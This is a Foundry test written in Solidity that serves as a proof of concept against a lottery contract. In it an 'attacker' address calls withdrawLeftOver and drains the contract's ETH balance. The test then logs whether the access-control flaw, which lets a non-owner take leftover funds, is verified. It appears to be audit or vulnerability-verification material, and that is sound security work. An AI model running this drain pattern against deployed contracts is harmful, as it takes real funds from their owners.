// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lotto.sol";

contract LottoTest is Test {
    Lotto public lotto;
    address owner = address(0x123);
    address attacker = address(0x456);

    function setUp() public {
        vm.startPrank(owner);
        lotto = new Lotto();
        // Fund contract with 5 ETH
        vm.deal(address(lotto), 5 ether);
        vm.stopPrank();
    }

    function test_NonOwnerCanWithdraw() public {
        // Ensure contract is funded
        uint initialContractBalance = address(lotto).balance;
        assertEq(initialContractBalance, 5 ether, "Contract should be funded");
        
        // Set winner directly using public function
        vm.prank(owner);
        lotto.setWinner(owner, 1 ether);
        
        // Trigger payout to winner (marks payment as complete)
        vm.prank(owner);
        lotto.sendToWinner();

        console.log("--- BEFORE-Trigger Withdraw ---");
        uint contractBalanceBefore = address(lotto).balance;
        uint attackerBalanceBefore = attacker.balance;
        console.log("Contract ETH balance before: %d wei", contractBalanceBefore);
        console.log("Attacker ETH balance before: %d wei", attackerBalanceBefore);

        console.log("--- Trigger Withdraw (attacker calls withdrawLeftOver) ---");
        // Record actual attacker balance change
        uint initialAttackerBalance = attacker.balance;
        
        // Attacker withdraws contract balance
        vm.prank(attacker);
        lotto.withdrawLeftOver();
        
        console.log("--- AFTER-Trigger Withdraw ---");
        uint contractBalanceAfter = address(lotto).balance;
        uint attackerBalanceAfter = attacker.balance;
        console.log("Contract ETH balance after: %d wei", contractBalanceAfter);
        console.log("Attacker ETH balance after: %d wei", attackerBalanceAfter);
        
        // Calculate actual changes
        uint256 contractBalanceDecrease = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceIncrease = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract balance decrease: %d wei", contractBalanceDecrease);
        console.log("Attacker balance increase: %d wei", attackerBalanceIncrease);
        
        // Vulnerability verification
        bool contractDrained = (contractBalanceAfter == 0);
        bool attackerGotFunds = (attackerBalanceIncrease == contractBalanceBefore);
        bool vulnerabilityExists = contractDrained && attackerGotFunds;
        
        if (vulnerabilityExists) {
            console.log("-----> Vulnerability VERIFIED: Non-owner drained contract ETH");
            console.log("Vulnerability Exists: Non-owner successfully withdrew leftover funds");
        } else {
            console.log("-----> Vulnerability NOT detected");
            console.log("Vulnerability not Exist: Non-owner cannot withdraw funds");
        }
    }
}